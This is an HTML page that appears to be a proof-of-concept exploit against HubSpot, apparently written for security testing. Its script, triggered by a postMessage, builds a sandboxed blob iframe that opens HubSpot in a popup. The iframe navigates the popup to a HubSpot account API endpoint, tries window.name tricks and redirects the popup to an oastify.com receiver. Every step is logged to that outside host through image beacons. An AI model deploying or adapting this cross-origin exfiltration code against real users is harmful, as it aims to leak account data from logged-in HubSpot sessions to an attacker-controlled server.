<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>Popup Exploitation</h2>
<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function l(m) { 
    const d = document.getElementById('log');
    d.innerHTML += '<br>' + m;
    d.scrollTop = d.scrollHeight;
    new Image().src = E + '/?s=' + encodeURIComponent(m); 
}

l('START_origin=' + window.origin);

// Open HubSpot
l('opening_hubspot');
let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');

if (!hub) {
    l('ERROR_blocked');
} else {
    l('popup_opened');
    
    let attempts = 0;
    let checker = setInterval(() => {
        attempts++;
        
        try {
            // Try to access - will throw when cross-origin
            hub.origin;
            if (attempts % 20 === 0) l('waiting_' + attempts);
        } catch(e) {
            clearInterval(checker);
            l('hubspot_loaded_after_' + attempts);
            
            // Now let's use the popup to navigate and exfiltrate data!
            setTimeout(() => {
                l('STARTING_DATA_EXTRACTION');
                
                // Method 1: Navigate to a data API endpoint
                l('navigating_to_api');
                hub.location = 'https://api.hubapi.com/account-info/v3/details';
                
                // The response will be displayed in the popup
                // We can't read it, but we can detect if it loaded
                
                setTimeout(() => {
                    l('checking_if_api_loaded');
                    
                    try {
                        // If we can access hub.location.href, it's same-origin (our origin)
                        let loc = hub.location.href;
                        l('STILL_ACCESSIBLE_url=' + loc.substring(0, 100));
                    } catch(err) {
                        l('cross_origin_so_page_changed');
                        
                        // Method 2: Navigate to our exfil server with window.name
                        setTimeout(() => {
                            l('setting_window_name');
                            
                            // Try to set window.name before navigating
                            try {
                                hub.name = 'hubspot_data_' + Date.now();
                                l('name_set=' + hub.name);
                            } catch(e) {
                                l('name_error');
                            }
                            
                            // Navigate to our domain to read window.name
                            l('navigating_to_exfil_server');
                            hub.location = E + '/receiver.html';
                            
                        }, 2000);
                    }
                }, 3000);
                
            }, 2000);
        }
        
        if (attempts > 150) {
            clearInterval(checker);
            l('timeout');
        }
    }, 100);
}
<\/script>
</body>
</html>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('iframe_added');
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
